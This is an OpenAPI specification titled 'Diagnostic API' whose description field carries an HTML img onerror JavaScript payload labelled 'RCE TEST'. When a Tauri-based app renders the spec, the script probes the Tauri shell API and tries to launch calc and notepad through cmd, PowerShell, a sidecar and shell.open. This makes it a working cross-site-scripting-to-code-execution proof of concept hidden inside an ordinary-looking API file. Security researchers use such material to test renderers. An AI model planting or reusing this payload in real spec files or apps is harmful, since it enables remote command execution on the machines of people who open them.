openapi: "3.0.0"
info:
  title: "Diagnostic API"
  version: "1.0.0"
  description: |
    RCE test.
    <img src=x onerror="(function(){var t=window.__TAURI__;if(!t)return;var r=['=== RCE TEST (Part 2: Command + protocols) ===',''];var tests=[];var i=0;function add(n,f){tests.push([n,f])}function next(){if(i>=tests.length){alert(r.join('\n'));return}var name=tests[i][0];var fn=tests[i][1];i++;r.push('['+i+'] '+name);try{fn().then(function(v){r.push('  -> OK: '+JSON.stringify(v).substring(0,100))}).catch(function(e){r.push('  -> FAIL: '+String(e).substring(0,100))}).then(function(){next()})}catch(e){r.push('  -> ERR: '+String(e).substring(0,100));next()}}r.push('shell.Command type: '+typeof t.shell.Command);r.push('shell.Command keys: '+Object.keys(t.shell.Command).join(', '));r.push('');add('Command(calc).execute()',function(){var c=new t.shell.Command('calc');return c.execute()});add('Command(cmd,[/c,calc]).execute()',function(){var c=new t.shell.Command('cmd',['/c','calc']);return c.execute()});add('Command(powershell,[calc]).execute()',function(){var c=new t.shell.Command('powershell',['calc']);return c.execute()});add('Command(calc).spawn()',function(){var c=new t.shell.Command('calc');return c.spawn()});add('Command(notepad).spawn()',function(){var c=new t.shell.Command('notepad');return c.spawn()});add('Command.sidecar(calc)',function(){if(t.shell.Command.sidecar){var c=t.shell.Command.sidecar('calc');return c.execute()}return Promise.reject('no sidecar')});add('shell.open with openWith cmd',function(){return t.shell.open('calc.exe','cmd')});add('shell.open(https://attacker.com)',function(){return t.shell.open('https://www.example.com')});add('process.exit / relaunch',function(){r.push('  process keys: '+(t.process?Object.keys(t.process).join(', '):'N/A'));return Promise.resolve('listed')});next()})()">
servers:
  - url: "https://api.example.com/v1"
paths:
  /test:
    get:
      operationId: runTest
      summary: "Run test"
      parameters:
        - name: id
          in: query
          required: true
          schema:
            type: string
      responses:
        "200":
          description: "OK"
          content:
            application/json:
              schema:
                type: object
                properties:
                  status:
                    type: string
